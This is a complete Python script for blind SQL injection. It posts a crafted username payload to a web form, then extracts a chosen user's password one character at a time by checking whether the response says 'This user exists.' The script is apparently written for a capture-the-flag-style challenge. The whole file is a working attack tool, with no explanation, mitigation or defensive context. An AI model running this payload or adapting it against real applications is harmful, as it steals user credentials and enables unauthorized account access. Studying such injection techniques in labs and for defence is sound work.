#!/usr/bin/env python3
import requests
import string
import sys

if len(sys.argv) != 5:
    print(f"Usage: {sys.argv[0]} <url> <user> <pass> <target>")
    sys.exit(1)

url, user, pw, target = sys.argv[1:]

charset = string.ascii_letters + string.digits
session = requests.Session()
session.auth = (user, pw)

print("[*] Starting blind SQL extraction")

password = ""

for pos in range(1, 33):
    found = False
    for ch in charset:
        payload = f'" OR username="{target}" AND password LIKE BINARY "{password}{ch}%" -- '

        r = session.post(url, data={"username": payload})

        if "This user exists." in r.text:
            password += ch
            print(f"[+] {password}")
            found = True
            break

    if not found:
        print("[!] No more characters found.")
        break

print("\n[✓] Final password:", password)
